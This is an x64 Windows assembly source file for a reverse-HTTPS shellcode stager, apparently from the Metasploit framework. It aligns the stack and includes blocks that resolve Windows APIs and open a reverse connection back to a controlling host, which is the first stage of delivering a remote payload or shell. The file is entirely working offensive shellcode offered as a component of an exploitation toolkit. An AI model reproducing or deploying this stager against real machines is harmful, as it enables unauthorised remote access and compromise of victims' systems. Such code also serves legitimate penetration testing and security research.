;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Rewritten for x64 by agix
; Compatible: Windows 7
; Architecture: x64
; Size: 570 bytes
; Build: >build.py stager_reverse_https
;-----------------------------------------------------------------------------;

[BITS 64]
[ORG 0]

  cld                    ; Clear the direction flag.
  and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop rbp                ; pop off the address of 'api_call' for calling later.
%include "./src/block/block_reverse_https.asm"
  ; By here we will have performed the reverse_tcp connection and EDI will be our socket
